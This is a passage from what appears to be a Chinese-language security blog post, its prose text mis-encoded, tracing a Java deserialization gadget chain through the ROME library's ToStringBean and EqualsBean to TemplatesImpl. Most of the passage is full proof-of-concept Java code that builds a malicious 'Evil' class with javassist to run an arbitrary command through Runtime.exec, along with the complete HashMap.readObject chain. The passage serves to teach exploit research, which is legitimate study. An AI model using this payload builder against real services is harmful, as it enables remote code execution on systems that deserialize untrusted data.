class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192146034.png" alt="image-20221116192146034"></p><p>å°¾é“¾ç°åœ¨æœ‰äº†ï¼Œé‚£æ€æ ·è°ƒç”¨åˆ°<code>getOutputProperties</code>?</p><p>ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œå‘ç°åœ¨<code>ToStringBean.toString(String)</code>å…ˆé€šè¿‡<code>BeanIntrospector.getPropertyDescriptors(_beanClass)</code> è·å– <code>_beanClass</code> ä¸­çš„ä»»æ„ getteræ–¹æ³•ï¼Œç„¶ååšäº†å‡ ä¸ªåˆ¤æ–­(å¯¹æˆ‘ä»¬æ„é€ æ²¡æœ‰å½±å“),æœ€åèµ°åˆ°<code>Object value = pReadMethod.invoke(_obj,NO_PARAMS)</code>ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192153048.png" alt="image-20221116192153048"></p><p>è¿™é‡Œçš„<code>pReadMethod.invoke()</code>ï¼Œå…¶å®å°±ç±»ä¼¼äºåå°„ä¸­çš„<code>method.invoke()</code>,å…¶ä¸­çš„<code>_obj</code>å‚æ•°æ˜¯å¯æ§çš„ï¼Œåœ¨å®ƒçš„æ„é€ å‡½æ•°é‡Œå°±ç›´æ¥å¯¹å…¶è¿›è¡Œäº†èµ‹å€¼ï¼Œæ‰€ä»¥é€šè¿‡<code>pReadMethod.invoke()</code> å¯ä»¥è°ƒç”¨åˆ° <code>TemplatesImpl.getOutputProperties()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192159154.png" alt="image-20221116192159154"></p><p>è¿˜æœ‰ä¸ªå°é—®é¢˜ï¼Œå› ä¸º<code>ToStringBean.toString(String)</code>ä¸º<strong>private</strong>ï¼Œä¸èƒ½ç›´æ¥è°ƒç”¨ï¼Œå¾€ä¸Šæ‰¾ä¸€ä¸‹ï¼Œæ— å‚çš„<code>toString()</code>å®Œç¾è§£å†³äº†è¿™ä¸ªé—®é¢˜</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192203797.png" alt="image-20221116192203797"></p><p><strong>exp2</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(c1, templates);</span><br><span class="line">        toStringBean.toString();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192215793.png" alt="image-20221116192215793"></p><p>ç»§ç»­å¾€ä¸Šæ‰¾è°ƒç”¨<code>toString()</code>çš„åœ°æ–¹ï¼Œ<code>EqualsBean.beanHashCode()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192225132.png" alt="image-20221116192225132"></p><p><code>_obj</code>å¯ä»¥é€šè¿‡æ„é€ å‡½æ•°ç›´æ¥èµ‹å€¼</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192229555.png" alt="image-20221116192229555"></p><p><strong>exp3</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(c1, templates);</span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> toStringBean.getClass();</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(c2, toStringBean);</span><br><span class="line">        equalsBean.beanHashCode();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192235913.png" alt="image-20221116192235913"></p><p>ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œå‘ç°è°ƒç”¨<code>beanHashCode()</code>çš„åœ°æ–¹æ˜¯<code>EqualsBean.hashCode()</code>,é‚£ä¹ˆè°ƒç”¨<strong>hashcode</strong>çš„åœ°æ–¹å°±å¤šäº†ï¼Œå¯ä»¥ç”¨<strong>HashMap.readObject</strong>ä½œä¸ºå…¥å£ï¼Œä»¥å®ç°è°ƒç”¨ä»»æ„ç±»çš„hashcode</p><h3 id="å®Œæ•´gadget"><a href="#å®Œæ•´gadget" class="headerlink" title="å®Œæ•´gadget"></a>å®Œæ•´gadget</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a><strong>poc</strong></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = RunCommand(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(c1, templates);</span><br><span class="line"><span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> toStringBean.getClass();</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(c2, toStringBean);</span><br><span class="line"><span class="comment">//        equalsBean.beanHashCode();</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] RunCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unseralize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192243413.png" alt="image-20221116192243413"></p><h3 id="POCä¼˜åŒ–"><a href="#POCä¼˜åŒ–" class="headerlink" 